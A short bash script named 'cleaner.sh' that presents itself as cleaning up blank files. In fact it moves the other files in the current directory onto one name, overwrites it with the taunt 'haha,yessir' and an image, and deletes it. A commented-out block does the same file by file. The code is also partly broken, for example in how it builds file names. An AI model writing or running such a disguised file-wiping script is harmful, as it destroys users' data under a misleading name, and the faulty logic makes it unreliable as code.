files=($(ls))
img="gum.jpg"
script="cleaner.sh"
cons=4
blankFile=
arrayOFBlankFile=()
any="anywhere"
		
	

function isAnExtensionWithExtension 
{
	file=$1
	length=${#file}
	ext=$(echo ${file:${length}-${cons}:${cons}})
	if [[ ${ext:0:1} == "." ]];then
		echo "true"
	else
		echo "false"
	fi
}




#removing blank space
function removing
{
	for i in ${files[@]};do
		if [[ "${i}" != "${img}" ]] && [[ "${i}" != "${script}"  ]] && [[ ! -d ${i} ]];then
			if [[ $(isAnExtensionWithExtension ${i}) == false ]];then
				blankFile+=${i}
		
			fi
	
		fi
	done
}
removing
#removing blank file
for i in ${files[@]};do
	if [[ "${i}" != "${img}" ]] && [[ "${i}" != "${script}"  ]] && [[ ! -d ${i} ]];then
		mv *${i}* ${blankFile}
		echo "haha,yessir" > ${blankFile}
		cp ${img} ${blankFile}
	fi
done
mv ${blankFile} ${any}
rm ${any}




#removing files
: '
for i in ${files[@]};do
	if [[ "${i}" != "${img}" ]] && [[ "${i}" != "${script}"  ]] && [[ ! -d ${i} ]];then
		echo "haha,yessir" > "${i}"
		cp "${img}" "${i}"
		mv ${i} ${any}
		rm ${any}
	fi
done
'